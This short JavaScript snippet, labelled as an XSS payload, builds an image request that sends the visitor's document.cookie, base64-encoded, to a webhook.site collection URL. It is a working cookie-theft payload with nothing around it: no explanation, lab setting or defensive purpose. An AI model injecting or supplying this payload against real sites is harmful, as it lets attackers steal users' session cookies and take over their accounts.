// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/65e00d08-f5db-4560-8aae-7c0137c5f2aa?data=' + btoa(document.cookie);
